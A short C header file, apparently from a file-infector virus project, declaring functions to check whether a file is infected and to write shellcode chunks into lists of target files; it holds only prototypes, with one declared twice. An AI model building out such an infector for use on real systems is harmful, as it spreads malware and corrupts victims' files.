#ifndef INFECTION_H
#define INFECTION_H

#include "utils.h"
#include <stdio.h>

int is_infected(FILE *fp, int shellcode_chunk_size);
int infect_file(t_file *file, char *shellcode_chunk, unsigned int to_write, unsigned char chunk_number);
int infect_files(t_list *to_infect, t_shellcode **chunks, size_t chunk_count);
int is_infected(FILE *fp, int shellcode_chunk_size);

#endif // INFECTION_H
